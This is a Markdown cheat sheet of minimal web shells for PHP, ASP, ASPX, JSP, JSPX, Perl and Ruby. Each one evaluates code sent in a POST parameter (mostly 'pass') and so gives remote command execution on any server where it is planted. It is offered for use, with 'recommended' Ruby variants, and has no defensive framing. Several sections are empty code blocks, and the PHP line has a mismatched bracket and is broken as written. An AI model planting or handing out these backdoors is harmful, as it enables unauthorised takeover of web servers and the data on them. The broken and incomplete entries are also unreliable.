# PHP

```PHP
<?php @eval($_POST['pass');?>
```

# ASP

```ASP
<%eval request("pass")%>
```

# .NET
# ASPX(JScript)

```ASPX
<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
```

## ASPX(C#)

```ASPX

```

## ASMX

```ASMX

```

## ASHX

```ASHX

```

# Java
## JSP

Nashorn:
```JSP
<%@ page import="javax.script.*" %>
<%
    if (request.getMethod().equals("POST")) {
        String code = request.getParameter("pass");
        if (code != null) {
            ScriptEngineManager manager = new ScriptEngineManager();
            ScriptEngine engine = manager.getEngineByName("js");
            
            engine.put("response", response); 
            engine.put("request", request);
            
            try {
                engine.eval(code);
            } catch (Exception e) {
                response.getWriter().println("Engine Error: " + e.getMessage());
            }
        }
    }
%>
```

---

ClassLoader:
```

```

## JSPX

Nashorn:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
    <jsp:directive.page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" import="javax.script.*" />
    
    <jsp:scriptlet>
        <![CDATA[
        if (request.getMethod().equals("POST")) {
            String code = request.getParameter("pass");
            if (code != null) {
                ScriptEngineManager manager = new ScriptEngineManager();
                ScriptEngine engine = manager.getEngineByName("js");
                
                engine.put("response", response); 
                engine.put("request", request);
                
                try {
                    engine.eval(code);
                } catch (Exception e) {
                    response.getWriter().println("Engine Error: " + e.getMessage());
                }
            }
        }
        ]]>
    </jsp:scriptlet>
</jsp:root>
```

---

ClassLoader:
```

```
 
# Perl

```Perl
use CGI;eval(CGI->new->param('test'));
```

# Ruby

Recommanded:

```Ruby
require 'uri'; $_POST = URI.decode_www_form(STDIN.read(ENV['CONTENT_LENGTH'].to_i)).to_h rescue {}; eval($_POST['pass']) if $_POST['pass']
```

---

No recommanded:
```Ruby
STDIN.read(ENV['CONTENT_LENGTH'].to_i).to_s =~ /pass=([^&]+)/; eval($1.gsub('+',' ').gsub(/%([a-fA-F0-9]{2})/){[$1.hex].pack('C')}) if $1
```

